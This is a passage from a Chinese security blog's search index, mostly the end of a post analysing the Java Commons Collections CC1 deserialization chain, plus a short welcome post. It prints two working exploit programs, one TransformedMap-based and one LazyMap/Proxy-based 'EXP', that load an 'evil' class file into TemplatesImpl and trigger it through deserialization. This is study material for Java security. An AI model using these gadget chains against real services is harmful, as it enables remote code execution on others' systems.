<span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        TemplatesImpl templates=<span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class templateClass=templates.getClass();</span><br><span class="line">        Field nameField=templateClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;Meteor&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field bytecodesfield=templateClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] evil= Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\code\\calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;evil&#125;;</span><br><span class="line">        bytecodesfield.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        Field tfactoryfield=templateClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryfield.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="comment">//        chainedTransformer.transform(1);</span></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;value&quot;</span>);<span class="comment">//这里是问题二中改键值对的值为注解中成员变量的名称，通过if判断</span></span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap= TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line">        Class c=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor constructor=c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object o=constructor.newInstance(Target.class,transformedmap);<span class="comment">//这里是问题二中第一个参数改注解为Target</span></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241130150406600.png" class="" title="This is an example image"><ul><li>然后是 Yso 正版链子的 TemplatesImpl 的实现方式。</li></ul><p>EXP 如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ysotemplate</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates, <span class="string">&quot;Meteor&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\code\\calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;evil&#125;;</span><br><span class="line">        bytecodesField.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="comment">//     templates.newTransformer();</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates), <span class="comment">// 构造 setValue 的可控参数</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorateMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader()</span><br><span class="line">                , <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);</span><br><span class="line">        invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);</span><br><span class="line"></span><br><span class="line">        serialize(invocationHandler);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241130150715540.png" class="" title="This is an example image">]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>新博客啦啦啦</title>
      <link href="/2024/12/26/hello-world/"/>
      <url>/2024/12/26/hello-world/</url>
      
        <content type="html"><![CDATA[<p>欢迎来到Meteor_Kai的暗黑系博客，一直觉得很帅，今天也是换上了，嘻嘻。</p><p>欢迎大师傅们交流哦，联系方式见About Me。</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
